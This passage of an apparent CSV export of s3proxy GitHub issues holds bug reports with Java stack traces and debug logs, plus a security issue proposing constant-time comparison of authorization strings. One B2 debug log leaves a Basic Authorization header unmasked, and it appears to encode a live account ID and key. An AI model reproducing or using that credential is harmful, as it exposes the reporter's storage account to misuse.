[s3proxy] I 01-08 14:44:14.404 main o.eclipse.jetty.server.Server:327 |::] jetty-9.2.z-SNAPSHOT
[s3proxy] I 01-08 14:44:14.458 main o.e.j.server.ServerConnector:266 |::] Started ServerConnector@42b02722{HTTP/1.1}{127.0.0.1:8080}
[s3proxy] I 01-08 14:44:14.458 main o.eclipse.jetty.server.Server:379 |::] Started @1155ms
[s3proxy] W 01-08 14:44:17.850 S3Proxy-Jetty-18 o.e.jetty.server.HttpChannel:396 |::] /
java.lang.NullPointerException: null
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:400)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:748)

client
====
$ curl http://localhost:8080/
  ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/253/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/253/comments,https://api.github.com/repos/gaul/s3proxy/issues/253/events,https://github.com/gaul/s3proxy/issues/253,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/252,286678305,MDExOlB1bGxSZXF1ZXN0MTYxNTgwODAy,252,gaul/s3proxy#251 Add check for non anonymous identity before extracting auth header,124870,closed,FALSE,NA,NA,3,2018-01-08T08:42:52Z,2018-01-09T22:31:18Z,2018-01-09T06:56:19Z,CONTRIBUTOR,NA,"Added simple check for non anonymous identity before attempting to read the auth header values.

List bucket and create bucket operations performed vial curl and aws cli now work as expected.

Fixes #251 ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/252/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/252/comments,https://api.github.com/repos/gaul/s3proxy/issues/252/events,https://github.com/gaul/s3proxy/pull/252,https://api.github.com/repos/gaul/s3proxy/pulls/252
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/251,286676502,MDU6SXNzdWUyODY2NzY1MDI=,251,Unable to perform bucket based operations with anonymous auth,124870,closed,FALSE,NA,NA,0,2018-01-08T08:32:30Z,2018-01-09T06:56:19Z,2018-01-09T06:56:19Z,CONTRIBUTOR,NA,"Affects Version: 1.5.4

Put simply, running s3proxy as detailed in the [main readme](https://github.com/gaul/s3proxy#usage-without-docker) and attempting to create a new bucket, or list buckets fails with a NPE

```
S3Proxy-Jetty-18 o.e.jetty.server.HttpChannel:396 |::] /testbucket
java.lang.NullPointerException: null
	at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:400)
	at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
	at org.eclipse.jetty.server.Server.handle(Server.java:499)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
	at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
	at java.lang.Thread.run(Thread.java:748)
```

The same error also occurs if the operations are attempted using the aws client (version: `aws-cli/1.11.190 Python/3.6.3 Darwin/17.2.0 botocore/1.7.48`)

```bash
aws s3 ls --endpoint-url http://localhost:8080 --region us-east-1

An error occurred (500) when calling the ListBuckets operation (reached max retries: 4): Internal Server Error

aws s3 mb s3://testbucket --endpoint-url http://localhost:8080 --region us-east-1
make_bucket failed: s3://testbucket An error occurred (500) when calling the CreateBucket operation (reached max retries: 4): Internal Server Error
```

It looks as if the changes introduced in `S3ProxyHandler` do not properly account for the anonymous auth situation, attempting to use the `authHeader` variable when it is never initialised.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/251/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/251/comments,https://api.github.com/repos/gaul/s3proxy/issues/251/events,https://github.com/gaul/s3proxy/issues/251,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/250,285605997,MDU6SXNzdWUyODU2MDU5OTc=,250,Use constant time comparison for authorization strings,848247,closed,FALSE,NA,NA,0,2018-01-03T06:11:28Z,2018-01-09T07:35:55Z,2018-01-09T07:35:55Z,OWNER,NA,"S3Proxy calls `String.equals` to compare the expected with the actual authorization strings.  This short-circuits on unequal characters and thus can leak that number of matched characters via a timing attack.  Instead it should call `MessageDigest.isEqual`.  References:

* https://blog.minio.io/minio-release-jan-2nd-2018-security-advisory-ef0342a4ddba
* https://codahale.com/a-lesson-in-timing-attacks/
* https://docs.oracle.com/javase/9/docs/api/java/security/MessageDigest.html#isEqual-byte:A-byte:A-",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/250/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/250/comments,https://api.github.com/repos/gaul/s3proxy/issues/250/events,https://github.com/gaul/s3proxy/issues/250,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/249,283289438,MDU6SXNzdWUyODMyODk0Mzg=,249,B2 refuses to login,325092,closed,FALSE,NA,NA,2,2017-12-19T16:22:35Z,2017-12-20T11:00:28Z,2017-12-20T11:00:28Z,NONE,NA,"```
$ cat s3proxy.conf
s3proxy.endpoint=http://127.0.0.1:8081
s3proxy.authorization=none
jclouds.provider=b2
jclouds.identity=xxxxxxxx
jclouds.credential=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
```
$ curl --request PUT http://localhost:8081/roatnaountor
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html;charset=ISO-8859-1""/>
<title>Error 500 </title>
</head>
<body>
<h2>HTTP ERROR: 500</h2>
<p>Problem accessing /roatnaountor. Reason:
<pre>    java.lang.IllegalStateException</pre></p>
<hr /><i><small>Powered by Jetty://</small></i>
</body>
</html>
```
```
$ java -DLOG_LEVEL=trace -jar s3proxy --properties s3proxy.conf
[s3proxy] I 12-19 16:08:50.905 main org.eclipse.jetty.util.log:186 |::] Logging initialized @8655ms
[s3proxy] I 12-19 16:08:51.196 main o.eclipse.jetty.server.Server:327 |::] jetty-9.2.z-SNAPSHOT
[s3proxy] I 12-19 16:08:51.445 main o.e.j.server.ServerConnector:266 |::] Started ServerConnector@3cd68{HTTP/1.1}{127.0.0.1:8081}
[s3proxy] I 12-19 16:08:51.449 main o.eclipse.jetty.server.Server:379 |::] Started @9212ms
[s3proxy] D 12-19 16:09:01.858 S3Proxy-13 o.gaul.s3proxy.S3ProxyHandler:270 |::] request: Request(PUT /roatnaountor)@394586
[s3proxy] T 12-19 16:09:01.864 S3Proxy-13 o.gaul.s3proxy.S3ProxyHandler:292 |::] header: User-Agent: curl/7.57.0
[s3proxy] T 12-19 16:09:01.866 S3Proxy-13 o.gaul.s3proxy.S3ProxyHandler:292 |::] header: Accept: */*
[s3proxy] T 12-19 16:09:01.868 S3Proxy-13 o.gaul.s3proxy.S3ProxyHandler:292 |::] header: Host: localhost:8081
[s3proxy] D 12-19 16:09:01.879 S3Proxy-13 o.gaul.s3proxy.S3ProxyHandler:1133 |::] Creating bucket with location: null
[s3proxy] T 12-19 16:09:01.978 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] >> converting b2_create_bucket
[s3proxy] T 12-19 16:09:02.069 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.b2.features.BucketApi.public abstract org.jclouds.b2.domain.Bucket org.jclouds.b2.features.BucketApi.createBucket(java.lang.String,org.jclouds.b2.domain.BucketType)
[s3proxy] T 12-19 16:09:02.072 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.b2.B2Api.public abstract org.jclouds.b2.features.BucketApi org.jclouds.b2.B2Api.getBucketApi()
[s3proxy] T 12-19 16:09:02.075 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.b2.features.BucketApi.public abstract org.jclouds.b2.domain.Bucket org.jclouds.b2.features.BucketApi.createBucket(java.lang.String,org.jclouds.b2.domain.BucketType)
[s3proxy] T 12-19 16:09:02.078 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] looking up default endpoint for org.jclouds.b2.features.BucketApi.public abstract org.jclouds.b2.domain.Bucket org.jclouds.b2.features.BucketApi.createBucket(java.lang.String,org.jclouds.b2.domain.BucketType)[roatnaountor, allPrivate]
[s3proxy] T 12-19 16:09:02.085 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] using default endpoint Optional.of(https://api.backblazeb2.com/) for org.jclouds.b2.features.BucketApi.public abstract org.jclouds.b2.domain.Bucket org.jclouds.b2.features.BucketApi.createBucket(java.lang.String,org.jclouds.b2.domain.BucketType)[roatnaountor, allPrivate]
[s3proxy] T 12-19 16:09:02.128 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] adding filter org.jclouds.b2.filters.RequestAuthorization@1391a72 from annotation on org.jclouds.b2.features.BucketApi
[s3proxy] T 12-19 16:09:02.329 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] << converted b2_create_bucket to POST https://api.backblazeb2.com/b2api/v1/b2_create_bucket HTTP/1.1
[s3proxy] T 12-19 16:09:02.356 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] << response from b2_create_bucket is parsed by ParseJson
[s3proxy] T 12-19 16:09:02.360 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] << exceptions from b2_create_bucket are parsed by MapHttp4xxCodesToExceptions
[s3proxy] D 12-19 16:09:02.363 S3Proxy-13 o.j.r.i.InvokeHttpMethod:56 |::] >> invoking b2_create_bucket
[s3proxy] T 12-19 16:09:02.386 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] >> converting b2_authorize_account
[s3proxy] T 12-19 16:09:02.389 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()
[s3proxy] T 12-19 16:09:02.393 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.b2.B2Api.public abstract org.jclouds.b2.features.AuthorizationApi org.jclouds.b2.B2Api.getAuthorizationApi()
[s3proxy] T 12-19 16:09:02.396 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()
[s3proxy] T 12-19 16:09:02.398 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] looking up default endpoint for org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[]
[s3proxy] T 12-19 16:09:02.402 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] using default endpoint Optional.of(https://api.backblazeb2.com/) for org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[]
[s3proxy] T 12-19 16:09:02.425 S3Proxy-13 o.j.r.i.RestAnnotationProcessor:47 |::] adding filter org.jclouds.http.filters.BasicAuthentication@1e4576e from annotation on authorizeAccount
[s3proxy] T 12-19 16:09:02.443 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] << converted b2_authorize_account to GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] T 12-19 16:09:02.449 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] << response from b2_authorize_account is parsed by ParseJson
[s3proxy] T 12-19 16:09:02.452 S3Proxy-13 o.j.r.i.InvokeHttpMethod:47 |::] << exceptions from b2_authorize_account are parsed by MapHttp4xxCodesToExceptions
[s3proxy] D 12-19 16:09:02.454 S3Proxy-13 o.j.r.i.InvokeHttpMethod:56 |::] >> invoking b2_authorize_account
[s3proxy] D 12-19 16:09:02.513 S3Proxy-13 o.j.h.i.JavaUrlHttpCommandExecutorService:56 |::] Sending request -487576823: GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:02.516 S3Proxy-13 jclouds.headers:56 |::] >> GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:02.519 S3Proxy-13 jclouds.headers:56 |::] >> Accept: application/json
[s3proxy] D 12-19 16:09:02.521 S3Proxy-13 jclouds.headers:56 |::] >> Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==
[s3proxy] D 12-19 16:09:04.693 S3Proxy-13 o.j.h.h.BackoffLimitedRetryHandler:56 |::] Retry 1/5: delaying for 1029 ms: server error: [method=org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[], request=GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1]
[s3proxy] D 12-19 16:09:05.729 S3Proxy-13 o.j.h.i.JavaUrlHttpCommandExecutorService:56 |::] Sending request -487576823: GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:05.732 S3Proxy-13 jclouds.headers:56 |::] >> GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:05.735 S3Proxy-13 jclouds.headers:56 |::] >> Accept: application/json
[s3proxy] D 12-19 16:09:05.737 S3Proxy-13 jclouds.headers:56 |::] >> Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==
[s3proxy] D 12-19 16:09:06.127 S3Proxy-13 o.j.h.h.BackoffLimitedRetryHandler:56 |::] Retry 2/5: delaying for 4342 ms: server error: [method=org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[], request=GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1]
[s3proxy] D 12-19 16:09:10.475 S3Proxy-13 o.j.h.i.JavaUrlHttpCommandExecutorService:56 |::] Sending request -487576823: GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:10.477 S3Proxy-13 jclouds.headers:56 |::] >> GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:10.480 S3Proxy-13 jclouds.headers:56 |::] >> Accept: application/json
[s3proxy] D 12-19 16:09:10.482 S3Proxy-13 jclouds.headers:56 |::] >> Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==
[s3proxy] D 12-19 16:09:10.868 S3Proxy-13 o.j.h.h.BackoffLimitedRetryHandler:56 |::] Retry 3/5: delaying for 9390 ms: server error: [method=org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[], request=GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1]
[s3proxy] D 12-19 16:09:20.264 S3Proxy-13 o.j.h.i.JavaUrlHttpCommandExecutorService:56 |::] Sending request -487576823: GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:20.266 S3Proxy-13 jclouds.headers:56 |::] >> GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:20.269 S3Proxy-13 jclouds.headers:56 |::] >> Accept: application/json
[s3proxy] D 12-19 16:09:20.272 S3Proxy-13 jclouds.headers:56 |::] >> Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==
[s3proxy] D 12-19 16:09:20.658 S3Proxy-13 o.j.h.h.BackoffLimitedRetryHandler:56 |::] Retry 4/5: delaying for 10000 ms: server error: [method=org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[], request=GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1]
[s3proxy] D 12-19 16:09:30.664 S3Proxy-13 o.j.h.i.JavaUrlHttpCommandExecutorService:56 |::] Sending request -487576823: GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:30.667 S3Proxy-13 jclouds.headers:56 |::] >> GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:30.669 S3Proxy-13 jclouds.headers:56 |::] >> Accept: application/json
[s3proxy] D 12-19 16:09:30.672 S3Proxy-13 jclouds.headers:56 |::] >> Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==
[s3proxy] D 12-19 16:09:31.072 S3Proxy-13 o.j.h.h.BackoffLimitedRetryHandler:56 |::] Retry 5/5: delaying for 10000 ms: server error: [method=org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[], request=GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1]
[s3proxy] D 12-19 16:09:41.078 S3Proxy-13 o.j.h.i.JavaUrlHttpCommandExecutorService:56 |::] Sending request -487576823: GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:41.081 S3Proxy-13 jclouds.headers:56 |::] >> GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1
[s3proxy] D 12-19 16:09:41.083 S3Proxy-13 jclouds.headers:56 |::] >> Accept: application/json
[s3proxy] D 12-19 16:09:41.086 S3Proxy-13 jclouds.headers:56 |::] >> Authorization: Basic MjNkYzMzZGU1YTdmOjAwMTYxZjliMmQ4NjQ2MWE1OTQzNGNmNDU1Y2Q4MjJiZTNhYzY5YWExMQ==
[s3proxy] E 12-19 16:09:41.469 S3Proxy-13 o.j.h.h.BackoffLimitedRetryHandler:88 |::] Cannot retry after server error, command has exceeded retry limit 5: [method=org.jclouds.b2.features.AuthorizationApi.public abstract org.jclouds.b2.domain.Authorization org.jclouds.b2.features.AuthorizationApi.authorizeAccount()[], request=GET https://api.backblazeb2.com/b2api/v1/b2_authorize_account HTTP/1.1]
[s3proxy] W 12-19 16:09:41.487 S3Proxy-13 o.e.jetty.server.HttpChannel:396 |::] /roatnaountor
java.lang.IllegalStateException: null
	at sun.security.ec.ECDHKeyAgreement.deriveKey(Native Method)
	at sun.security.ec.ECDHKeyAgreement.engineGenerateSecret(ECDHKeyAgreement.java:130)
	at sun.security.ec.ECDHKeyAgreement.engineGenerateSecret(ECDHKeyAgreement.java:163)
	at javax.crypto.KeyAgreement.generateSecret(KeyAgreement.java:648)
	at sun.security.ssl.ECDHCrypt.getAgreedSecret(ECDHCrypt.java:102)
	at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1061)
	at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348)
	at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1026)
	at sun.security.ssl.Handshaker.process_record(Handshaker.java:961)
	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1072)
	at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1385)
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1413)
	at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1397)
	at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559)
	at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185)
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1564)
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492)
	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:263)
	at org.jclouds.http.internal.JavaUrlHttpCommandExecutorService.invoke(JavaUrlHttpCommandExecutorService.java:96)
	at org.jclouds.http.internal.JavaUrlHttpCommandExecutorService.invoke(JavaUrlHttpCommandExecutorService.java:65)
	at org.jclouds.http.internal.BaseHttpCommandExecutorService.invoke(BaseHttpCommandExecutorService.java:100)
	at org.jclouds.rest.internal.InvokeHttpMethod.invoke(InvokeHttpMethod.java:90)
	at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:73)
	at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:44)
	at org.jclouds.reflect.FunctionalReflection$FunctionalInvocationHandler.handleInvocation(FunctionalReflection.java:117)
	at com.google.common.reflect.AbstractInvocationHandler.invoke(AbstractInvocationHandler.java:87)
	at com.sun.proxy.$Proxy56.authorizeAccount(Unknown Source)
	at org.jclouds.b2.config.B2HttpApiModule$1.get(B2HttpApiModule.java:73)
	at org.jclouds.b2.config.B2HttpApiModule$1.get(B2HttpApiModule.java:70)
	at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier$SetAndThrowAuthorizationExceptionSupplierBackedLoader.load(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:75)
	at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier$SetAndThrowAuthorizationExceptionSupplierBackedLoader.load(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:57)
	at com.google.common.cache.LocalCache$LoadingValueReference.loadFuture(LocalCache.java:3524)
	at com.google.common.cache.LocalCache$Segment.loadSync(LocalCache.java:2317)
	at com.google.common.cache.LocalCache$Segment.lockedGetOrLoad(LocalCache.java:2280)
	at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2195)
	at com.google.common.cache.LocalCache.get(LocalCache.java:3934)
	at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3938)
	at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4821)
	at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.get(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:150)
	at org.jclouds.b2.filters.RequestAuthorization.filter(RequestAuthorization.java:44)
	at org.jclouds.http.internal.BaseHttpCommandExecutorService.invoke(BaseHttpCommandExecutorService.java:92)
	at org.jclouds.rest.internal.InvokeHttpMethod.invoke(InvokeHttpMethod.java:90)
	at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:73)
	at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:44)
	at org.jclouds.reflect.FunctionalReflection$FunctionalInvocationHandler.handleInvocation(FunctionalReflection.java:117)
	at com.google.common.reflect.AbstractInvocationHandler.invoke(AbstractInvocationHandler.java:87)
	at com.sun.proxy.$Proxy44.createBucket(Unknown Source)
	at org.jclouds.b2.blobstore.B2BlobStore.createContainerInLocation(B2BlobStore.java:150)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
	at com.sun.proxy.$Proxy42.createContainerInLocation(Unknown Source)
	at org.gaul.s3proxy.S3ProxyHandler.handleContainerCreate(S3ProxyHandler.java:1143)
	at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:620)
	at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
	at org.eclipse.jetty.server.Server.handle(Server.java:499)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
	at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
	at java.lang.Thread.run(Thread.java:748)

```
Version 1.5.3
I verified that `Authorization: Basic` value is correct base64 of `accid:appkey`, and `b2` command line tool works with the same credentials.
Also I verified that s3proxy works as expected with filesystem provider.

How to check full body and headers of HTTP requests and responses?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/249/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/249/comments,https://api.github.com/repos/gaul/s3proxy/issues/249/events,https://github.com/gaul/s3proxy/issues/249,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/248,275839199,MDU6SXNzdWUyNzU4MzkxOTk=,248,Support Wasabi ,5224664,closed,FALSE,NA,NA,2,2017-11-21T19:52:51Z,2017-11-22T03:13:35Z,2017-11-22T03:13:35Z,NONE,NA,"Wasabi is a popular s3 client that uses the same api calls as s3.

https://wasabi.com/wp-content/themes/wasabi/docs/API_Guide/index.html#t=topics%2FFrontMatter.htm",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/248/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/248/comments,https://api.github.com/repos/gaul/s3proxy/issues/248/events,https://github.com/gaul/s3proxy/issues/248,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/247,273172010,MDU6SXNzdWUyNzMxNzIwMTA=,247,[Atmos] No ETag is returned ,703870,closed,FALSE,NA,NA,0,2017-11-11T20:02:47Z,2017-11-11T22:50:28Z,2017-11-11T22:50:28Z,CONTRIBUTOR,NA,"S3Proxy does not return an ETag for Atmos objects, but it could return the EMC object ID (an opaque 44 byte identifier).",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/247/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/247/comments,https://api.github.com/repos/gaul/s3proxy/issues/247/events,https://github.com/gaul/s3proxy/issues/247,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/246,271251218,MDExOlB1bGxSZXF1ZXN0MTUwNzA5MjY4,246,v2/v4 auth improve,2541177,closed,FALSE,NA,NA,5,2017-11-05T06:01:36Z,2018-02-24T10:24:14Z,2018-01-03T01:32:50Z,CONTRIBUTOR,NA,"* 15 minitues timeskew
* Add x-amz-date header or query parameter check
* Change the timeskew logic to first get client req auth type
* When v2,x-amz-date header format is rfc2616,when v4,is iso8601
* If have both x-amz-date header and date header,date value in
  stringtosign is x-amz-date header value,CanonicalizedAmzHeaders
  have no x-amz-header.
  Ref Delete example in site:
  http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html
* Fix v2 query auth:
  If expires is nil ,does not mean that the auth type is not queryauth type.
  Ref http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html#RESTAuthenticationQueryStringAuth
  It says that 'Additionally, you can limit a pre-signed request by specifying an expiration time.'",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/246/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/246/comments,https://api.github.com/repos/gaul/s3proxy/issues/246/events,https://github.com/gaul/s3proxy/pull/246,https://api.github.com/repos/gaul/s3proxy/pulls/246
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/245,270518576,MDU6SXNzdWUyNzA1MTg1NzY=,245,s3proxy not to check timeskew when supplied non-current sys time to req,2541177,closed,FALSE,NA,NA,8,2017-11-02T03:09:46Z,2018-01-05T08:20:29Z,2018-01-05T08:20:29Z,CONTRIBUTOR,NA,"On goofys test case.
The minio and aws like s3 backend we have all check the timeskew.
But When use the proxys3 backend(config from goofys ,using the /tmp),it skip the timeskew.

Please ref goofys pull request https://github.com/kahing/goofys/pull/243.
 ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/245/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/245/comments,https://api.github.com/repos/gaul/s3proxy/issues/245/events,https://github.com/gaul/s3proxy/issues/245,NA
